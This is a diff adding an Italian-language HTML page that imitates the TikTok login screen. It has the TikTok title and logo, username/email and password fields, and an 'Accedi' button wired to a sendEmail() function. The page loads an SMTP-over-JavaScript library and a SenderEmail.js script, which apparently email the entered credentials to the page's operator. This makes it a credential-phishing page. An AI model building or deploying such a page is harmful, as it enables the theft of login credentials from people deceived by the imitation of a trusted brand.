@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="it" dir="ltr"style="background-color="white"">
+<link rel="stylesheet" href="style.css">
+  <head>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="SenderEmail.js" charset="utf-8"></script>
+    <meta charset="utf-8">
+    <title>TikTok</title>
+    <img
+       align="left"
+       style="height:50px;
+       margin-left: -20px"
+       src="img\tiktokLogo.jpeg" alt=""/>
+    <img
+       align="right"
+       style="height:50px;
+       margin-top:-10px"
+       src="img\info.jpeg" alt=""/>
+  </head>
+  <body>
+<div class="testoLog"><br><br><br><br><br><br><br><br>
+  <h2 style="position: relative;top:70px;font-family: 'Lato', sans-serif;height:100px;weight:100px">Accedi</h2>
+  <h4 style="margin-top: 30px;margin-left:-210px;font-family: 'Lato', sans-serif;height:100px;weight:100px;opacity:75%">Email o nome utente</h4>
+  <input id="Nome/Email" style="position: relative;top:-70px;margin-top:-30px"class="input" type="text" placeholder="Email or Usurname">
+  <br>
+  <input id="Password" style="position: relative;top:-40px;margin-top:-30px"class="input" type="password" placeholder="Password">
+  <br>
+  <h6 style="position: relative;top:-50px;margin-top: 30px;margin-left:-250px;font-family: 'Lato', sans-serif;height:100px;weight:100px;opacity:85%">Password dimenticata?</h6>
+  <br>
+  <button id="btnAccedi" onclick="sendEmail()" class="btnAccedi" type="button">
+    <strong>
+    Accedi
+  </strong>
+  </button>
+</div>
+ </body>
+</html>
